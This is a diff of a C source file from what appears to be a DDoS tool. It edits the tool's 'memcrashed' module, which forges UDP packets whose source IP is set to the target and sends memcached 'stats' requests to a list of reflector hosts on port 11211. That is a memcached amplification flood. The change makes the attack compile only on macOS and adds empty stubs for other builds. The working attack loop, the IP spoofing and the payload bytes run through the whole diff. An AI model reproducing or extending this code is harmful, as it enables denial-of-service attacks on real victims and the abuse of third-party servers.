@@ -11,16 +11,17 @@
 #include "ddos.h"//configuration
 #include "message.h"
 #include "util.h"
-#include "types.h"
 
 #include <pthread.h>
 #include <netinet/ip.h>
 #include <netinet/udp.h>
 #include <arpa/inet.h>
 #include <math.h>//pow
+#include <stdint.h>
 
 #ifdef __APPLE__
 #define iphdr ip
+#define MEMCRASHED_INCLUDED
 #endif
 
 #define DEBUG
@@ -37,9 +38,8 @@ unsigned short csum (unsigned short *buf, int nwords)
     sum += (sum >> 16);
     return (unsigned short)(~sum);
 }
-
+#ifdef MEMCRASHED_INCLUDED
 void init_ip(struct iphdr* iph,char* target){
-#ifdef __APPLE__
     iph->ip_hl = 5;
     iph->ip_v = 4;
     iph->ip_tos = 0;
@@ -52,36 +52,15 @@ void init_ip(struct iphdr* iph,char* target){
     struct in_addr s;
     s.s_addr=inet_addr(target);
     iph->ip_src = s;
-#else
-    iph->ihl = 5;
-    iph->version = 4;
-    iph->tos = 0;
-    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 15;
-    iph->id = htonl(54321);
-    iph->frag_off = 0;
-    iph->ttl = MAXTTL;
-    iph->protocol = IPPROTO_UDP;
-    iph->check = 0;
-    iph->saddr = inet_addr(target);
-#endif
 }
 
 void init_udp(struct udphdr *udph,int port){//port--target port
-#ifdef __APPLE__
     udph->uh_sport=htons(port);
     udph->uh_dport=htons(11211);//memcached port
     udph->uh_sum=0;
     memcpy((void *)udph + sizeof(struct udphdr), "\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n", 15);
     udph->uh_ulen=htons(sizeof(struct udphdr) + 15);
-#else
-    udph->source = htons(port);
-    udph->dest = htons(11211);
-    udph->check = 0;
-    memcpy((void *)udph + sizeof(struct udphdr), "\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n", 15);
-    udph->len=htons(sizeof(struct udphdr) + 15);
-#endif
 }
-
 void _memcrashed_ddos(char *target,int port,slist *hosts){
     char datagram[MAX_PSIZE];
     struct iphdr *iph = (struct iphdr*)datagram;
@@ -97,11 +76,7 @@ void _memcrashed_ddos(char *target,int port,slist *hosts){
     init_rand((uint32_t)time(NULL));
     init_ip(iph, target);
     init_udp(udph, port);
-#ifdef __APPLE__
     udph->uh_sport=randport();
-#else
-    udph->source=randport();
-#endif
     _node* cur=nth_slist(hosts,randrange(0, (int)hosts->length));
     while (__run){//launch attack
         char* __ip=cur->val;
@@ -109,23 +84,15 @@ void _memcrashed_ddos(char *target,int port,slist *hosts){
         struct sockaddr_in t;
         t.sin_family=AF_INET;
         t.sin_addr.s_addr=_ip;
-#ifndef __APPLE__
-        sendto(sock, datagram, iph->tot_len, 0, (struct sockaddr *) &t, sizeof(t));
-#else
         sendto(sock, datagram, iph->ip_len, 0, (struct sockaddr *) &t, sizeof(t));
-#endif
+
         cur=cur->next;
         struct in_addr _t;
         _t.s_addr=inet_addr(cur->val);
-#ifdef __APPLE__
+
         iph->ip_dst=_t;
         iph->ip_id = htonl(rand_cmwc() & 0xFFFFFFFF);
         iph->ip_sum = csum ((unsigned short *) datagram, iph->ip_len >> 1);
-#else
-        iph->daddr=_t;
-        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
-        iph->check = csum ((unsigned short *) datagram, iph->ip_len >> 1);
-#endif
         psent+=1;
         if(dos_sleep>0){
             sleep_ms(dos_sleep);
@@ -134,6 +101,18 @@ void _memcrashed_ddos(char *target,int port,slist *hosts){
     //free(target);
     //free_slist(hosts);
 }
+#else
+void _memcrashed_ddos(char *target,int port,slist *hosts){
+    
+}
+void init_udp(struct udphdr *udph,int port){
+    
+}
+void init_ip(struct iphdr* iph,char* target){
+
+}
+#endif
+#ifdef MEMCRASHED_INCLUDED
 void memcrashed_init(const char* hostfile){
     FILE* fp=fopen(hostfile, "r");
     if(!fp){
@@ -150,6 +129,12 @@ void memcrashed_init(const char* hostfile){
         free(line);
     }
 }
+#else
+void memcrashed_init(const char* hostfile){
+     die("Memcrashed is not included in this build.");
+}
+#endif
+#ifdef MEMCRASHED_INCLUDED
 void memcrashed_ddos(_dos_param* _p){//wrapper
     assert(_p->mode==MODE_MEMCRASHED);
     if(!_hosts){
@@ -157,7 +142,13 @@ void memcrashed_ddos(_dos_param* _p){//wrapper
     }
     _memcrashed_ddos(_p->host, _p->port, _hosts);
 }
-void memcrashed_status(){
+#else
+void memcrashed_ddos(_dos_param* _p){//wrapper
+   
+}
+#endif
+#ifdef MEMCRASHED_INCLUDED
+void memcrashed_status(void){
     success("Status:");
     success("Hit ^C to exit");
     const char * metrics_str=metrics2str(metrics);
@@ -169,3 +160,8 @@ void memcrashed_status(){
         psent+=MAX_PSIZE/pow(1024.0,metrics);
     }
 }
+#else
+void memcrashed_status(void){
+    die("Memcrashed is not included in current build.");
+}
+#endif
